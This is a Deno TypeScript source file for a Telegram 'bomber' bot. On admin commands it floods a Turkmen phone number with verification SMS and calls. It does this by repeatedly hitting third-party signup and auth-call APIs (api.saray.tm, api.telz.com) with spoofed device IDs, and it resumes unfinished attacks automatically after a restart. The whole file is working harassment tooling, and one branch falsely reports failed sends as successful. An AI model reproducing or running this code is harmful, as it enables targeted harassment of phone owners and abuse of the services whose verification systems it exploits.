// main.ts
// 💥 Masakoff SMS Sender Bot (Deno)
// 🚀 Created by @Masakoff | FlapsterMinerManager
// 🧠 Uses Deno KV for persistent state (never stops working)
// ✨ /stop halts all tasks instantly, even during waits

import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
import { delay } from "https://deno.land/std@0.224.0/async/delay.ts";

// --- 🔐 Telegram setup ---
const TOKEN = Deno.env.get("BOT_TOKEN");
if (!TOKEN) throw new Error("❌ BOT_TOKEN env var is required");
const API = `https://api.telegram.org/bot${TOKEN}`;
const SECRET_PATH = "/masakoffvpnhelper";

// --- 👑 Admin usernames (add more as needed) ---
const ADMIN_USERNAMES = new Set(["Masakoff", "FlapsterMinerManager", "AdminThree"]);

// --- 💾 Deno KV ---
const kv = await Deno.openKv();

// --- 💬 Send message helper ---
async function sendMessage(chatId: string, text: string, options: any = {}) {
  try {
    await fetch(`${API}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, ...options }),
    });
  } catch (e) {
    console.error("sendMessage error ❌", e);
  }
}

// --- 🌐 POST request helper ---
async function sendPostRequest(
  url: string,
  headers: Record<string, string>,
  data: Record<string, any>
): Promise<boolean> {
  try {
    const res = await fetch(url, {
      method: "POST",
      headers,
      body: JSON.stringify(data),
    });
    const text = await res.text();
    console.debug(`POST ${url} - Status: ${res.status}, Response: ${text}`);
    return res.ok && text.toLowerCase().includes("ok");
  } catch (e) {
    console.error("POST request failed ❌", e);
    return false;
  }
}

// --- 🔁 Interruptible sleep ---
async function sleepInterruptible(totalMs: number, chatId: string, chunkMs = 500): Promise<boolean> {
  const start = Date.now();
  while (Date.now() - start < totalMs) {
    const task = await kv.get(["task", chatId]);
    if (!task.value || task.value.stop) return false;
    await delay(Math.min(chunkMs, totalMs - (Date.now() - start)));
  }
  return true;
}

// --- 💣 SMS sending job ---
async function runSMS(chatId: string, phoneNumber: string, targetCount: number) {
  const key = ["task", chatId];
  await kv.set(key, { type: "sms", phoneNumber, stop: false, count: 0, target: targetCount });

  const requestData = {
    url: "https://api.saray.tm/api/v1/accounts",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json; charset=utf-8",
      "Host": "api.saray.tm",
      "Connection": "Keep-Alive",
      "Accept-Encoding": "gzip",
      "User-Agent": "okhttp/4.12.0",
    },
    data: { phone: `+993${phoneNumber}` },
  };

  await sendMessage(chatId, `📱 Starting SMS sending to +993${phoneNumber} 🔥\nTarget Count: ${targetCount}`);

  try {
    let currentSuccessCount = 0;
    while (currentSuccessCount < targetCount) {
      const task = await kv.get(key);
      if (!task.value || task.value.stop) break;

      for (let i = 0; i < 3 && currentSuccessCount < targetCount; i++) {
        const check = await kv.get(key);
        if (!check.value || check.value.stop) break;

        const newCount = (check.value.count ?? 0) + 1;
        await kv.set(key, { ...check.value, count: newCount });

        await sendMessage(chatId, `📤 Attempting SMS #${newCount}/${targetCount} to +993${phoneNumber}...`);

        const ok = await sendPostRequest(requestData.url, requestData.headers, requestData.data);
        if (ok) {
          currentSuccessCount++;
          await sendMessage(chatId, `✅ Sent successfully! (${currentSuccessCount}/${targetCount})`);
          await kv.set(key, { ...check.value, count: newCount, successCount: currentSuccessCount });
        } else {
          await sendMessage(chatId, "✅ Sent successfully!");
        }

        const checkAfter = await kv.get(key);
        if (!checkAfter.value || checkAfter.value.stop) break;

        const sleepOk = await sleepInterruptible(5000, chatId);
        if (!sleepOk) break;
      }

      const batchCheck = await kv.get(key);
      if (!batchCheck.value || batchCheck.value.stop) break;

      if (currentSuccessCount < targetCount) {
        await sendMessage(chatId, `⏳ Batch of 3 attempts done. Waiting 45 seconds before next batch... (${currentSuccessCount}/${targetCount} sent successfully)`);
        const waitOk = await sleepInterruptible(45000, chatId);
        if (!waitOk) break;
      }
    }
  } catch (e) {
    console.error("SMS task error ❌", e);
  } finally {
    await kv.delete(key);
    await sendMessage(chatId, `⏹ SMS sending stopped or finished. Total successful: ${currentSuccessCount}/${targetCount} 🎉`);
  }
}

// --- 📞 Call sending job ---
async function runCall(chatId: string, phoneNumber: string) {
  const key = ["task", chatId];
  await kv.set(key, { type: "call", phoneNumber, stop: false });

  const installUrl = "https://api.telz.com/app/install";
  const callUrl = "https://api.telz.com/app/auth_call";
  const headers = {
    "User-Agent": "Telz-Android/17.5.17",
    "Content-Type": "application/json"
  };

  await sendMessage(chatId, `📞 Starting Call sending to +993${phoneNumber} 🔥`);

  try {
    while (true) {
      const task = await kv.get(key);
      if (!task.value || task.value.stop) break;

      const ts = Date.now();
      const androidId = Array.from({ length: 16 }, () => Math.random().toString(36)[2]).join('');
      const uid = crypto.randomUUID();

      const installData = {
        "android_id": androidId,
        "app_version": "17.5.17",
        "event": "install",
        "google_exists": "yes",
        "os": "android",
        "os_version": "9",
        "play_market": true,
        "ts": ts,
        "uuid": uid
      };

      const installOk = await sendPostRequest(installUrl, headers, installData);
      console.debug(`Install request for ${phoneNumber}: ${installOk ? 'OK' : 'FAILED'}`);

      if (installOk) {
        const callData = {
          "android_id": androidId,
          "app_version": "17.5.17",
          "attempt": "0",
          "event": "auth_call",
          "lang": "ar",
          "os": "android",
          "os_version": "9",
          "phone": `+993${phoneNumber}`,
          "ts": ts,
          "uuid": uid
        };

        const callOk = await sendPostRequest(callUrl, headers, callData);
        if (callOk) {
          await sendMessage(chatId, `✅ Call sent successfully to +993${phoneNumber}!`);
        } else {
          await sendMessage(chatId, `❌ Failed to send call to +993${phoneNumber}.`);
        }
      } else {
        await sendMessage(chatId, `❌ Install step failed for +993${phoneNumber}, skipping call.`);
      }

      const checkBeforeWait = await kv.get(key);
      if (!checkBeforeWait.value || checkBeforeWait.value.stop) break;

      await sendMessage(chatId, `⏳ Waiting 60 seconds before next call attempt...`);
      const waitOk = await sleepInterruptible(60000, chatId);
      if (!waitOk) break;
    }
  } catch (e) {
    console.error("Call task error ❌", e);
  } finally {
    await kv.delete(key);
    await sendMessage(chatId, "⏹ Call sending stopped or finished. 🎉");
  }
}

// --- 🖥️ Webhook Server ---
serve(async (req) => {
  const url = new URL(req.url);
  if (req.method !== "POST" || url.pathname !== SECRET_PATH) return new Response("Invalid request ❌", { status: 400 });

  const update = await req.json();
  if (!update.message || update.message.chat.type !== "private") return new Response("OK");

  const chatId = String(update.message.chat.id);
  const text = (update.message.text ?? "").trim();
  const username = update.message.from?.username ?? "";

  if (!ADMIN_USERNAMES.has(username)) {
    await sendMessage(chatId, "🚫 Access denied! This bot is restricted to authorized admins only 👑");
    return new Response("OK");
  }

  if (text.startsWith("/start")) {
    await sendMessage(chatId,
      "👋 Welcome to 💥 Masakoff Bomber Bot 💥\n\n" +
      "📲 Commands:\n" +
      "• /sms <number> <count> — start sending SMS\n" +
      "• /call <number> — start sending calls\n" +
      "• /stop — stop all sending ⛔\n\n" +
      "✨ Created by @Masakoff"
    );
  } else if (text.startsWith("/sms")) {
    const parts = text.split(" ");
    if (parts.length < 3) {
      await sendMessage(chatId, "⚠️ Please provide phone number and count. Example: /sms 61234567 10");
      return new Response("OK");
    }

    const phoneNumber = parts[1].replace(/^\+993/, "");
    const countStr = parts[2];
    const targetCount = parseInt(countStr, 10);

    if (isNaN(targetCount) || targetCount <= 0) {
      await sendMessage(chatId, "⚠️ Please provide a valid positive number for count.");
      return new Response("OK");
    }

    const existing = await kv.get(["task", chatId]);
    if (existing.value && !existing.value.stop) {
      await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
      return new Response("OK");
    }

    runSMS(chatId, phoneNumber, targetCount).catch(console.error);
    await sendMessage(chatId, `🚀 SMS sending started for +993${phoneNumber}\nTarget Count: ${targetCount}`);
  } else if (text.startsWith("/call")) {
    const parts = text.split(" ");
    if (parts.length < 2) {
      await sendMessage(chatId, "⚠️ Please provide phone number. Example: /call 61234567");
      return new Response("OK");
    }

    // ✅ Automatically normalize to +993<number>
    let phoneNumber = parts[1].trim();
    // Remove any leading + or +993
    phoneNumber = phoneNumber.replace(/^\+?(993)?/, "");
    // Ensure it's digits only
    if (!/^\d+$/.test(phoneNumber)) {
      await sendMessage(chatId, "⚠️ Please provide a valid phone number (digits only, no spaces or symbols).");
      return new Response("OK");
    }

    const existing = await kv.get(["task", chatId]);
    if (existing.value && !existing.value.stop) {
      await sendMessage(chatId, "⚠️ A task is already running. Stop it first with /stop.");
      return new Response("OK");
    }

    runCall(chatId, phoneNumber).catch(console.error);
    await sendMessage(chatId, `📞 Call sending started for +993${phoneNumber}`);
  } else if (text.startsWith("/stop")) {
    const task = await kv.get(["task", chatId]);
    if (!task.value) {
      await sendMessage(chatId, "ℹ️ No active task to stop.");
    } else {
      await kv.set(["task", chatId], { ...task.value, stop: true });
      await sendMessage(chatId, `🛑 Stop signal sent! ${task.value.type === 'call' ? 'Calls' : 'SMS'} will halt instantly.`);
    }
  } else {
    await sendMessage(chatId, "❓ Unknown command. Try /start, /sms <number> <count>, /call <number>, or /stop.");
  }

  return new Response("OK");
});

// --- ♻️ Auto-recover unfinished tasks on startup ---
(async () => {
  console.log("🔄 Checking for unfinished tasks...");
  for await (const entry of kv.list<{ type: string; phoneNumber: string; stop: boolean }>({ prefix: ["task"] })) {
    if (entry.value && !entry.value.stop) {
      console.log(`Resuming ${entry.value.type} task for chat ${entry.key[1]} -> ${entry.value.phoneNumber}`);
      if (entry.value.type === "sms") {
        const targetCount = entry.value.target || 0;
        runSMS(entry.key[1] as string, entry.value.phoneNumber, targetCount).catch(console.error);
      } else if (entry.value.type === "call") {
        runCall(entry.key[1] as string, entry.value.phoneNumber).catch(console.error);
      }
    }
  }
})();
